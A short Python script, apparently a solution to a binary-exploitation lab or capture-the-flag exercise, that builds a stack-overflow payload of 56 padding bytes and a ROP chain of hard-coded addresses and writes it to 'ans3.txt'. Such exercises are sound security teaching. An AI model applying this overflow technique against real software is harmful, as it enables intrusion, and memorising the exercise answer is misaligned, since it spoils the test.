from struct import pack

def p64(x):
    return pack("<Q", x)

payload = b"A" * 56 \
        + p64(0x4012da) + p64(114) \
        + p64(0x4012f1) + p64(0x401216) \
        + p64(0x401308)

with open("ans3.txt", "wb") as f:
    f.write(payload)

print("payload written")

